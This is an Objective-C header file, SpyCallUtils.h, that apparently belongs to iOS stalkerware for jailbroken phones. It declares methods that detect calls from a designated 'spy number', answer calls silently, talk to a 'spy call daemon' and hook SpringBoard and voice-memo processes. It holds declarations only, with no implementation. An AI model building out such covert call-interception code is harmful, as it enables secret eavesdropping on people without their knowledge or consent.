//
//  SpyCallUtils.h
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "Telephony.h"

@class FxCall, AVController;

@interface SpyCallUtils : NSObject {

}

+ (NSString *) telephoneNumber: (CTCall *) aCall;
+ (NSInteger) callCauseCode: (CTCall *) aCall;
+ (void) answerCall: (CTCall *) aCall;
+ (BOOL) isCallWaiting: (CTCall *) aCall;
+ (BOOL) isSpyNumber: (NSString *) aTelephoneNumber;
+ (BOOL) isSpyCall: (CTCall *) aCall;
+ (BOOL) isOutgoingCall: (CTCall *) aCall;

+ (BOOL) sendCommandToSpyCallDaemon: (NSInteger) aCommandID cmdInfo: (id) aInfo;

+ (BOOL) isSpringBoardHook;
+ (BOOL) isMobileApplicationHook;
+ (BOOL) isVoiceMemoHook;

+ (BOOL) isIOS7;
+ (BOOL) isIOS6;
+ (BOOL) isIOS5;
+ (BOOL) isIOS4;

+ (void) prepareToAnswerCall;

+ (BOOL) isPlayingAudio;
+ (BOOL) isRecordingAudio;

+ (BOOL) isAudioActiveFromFirstCheck;

+ (void) setAVController: (AVController *) aAVController category: (NSString *) aCategory transition: (NSInteger) aTransition;

@end
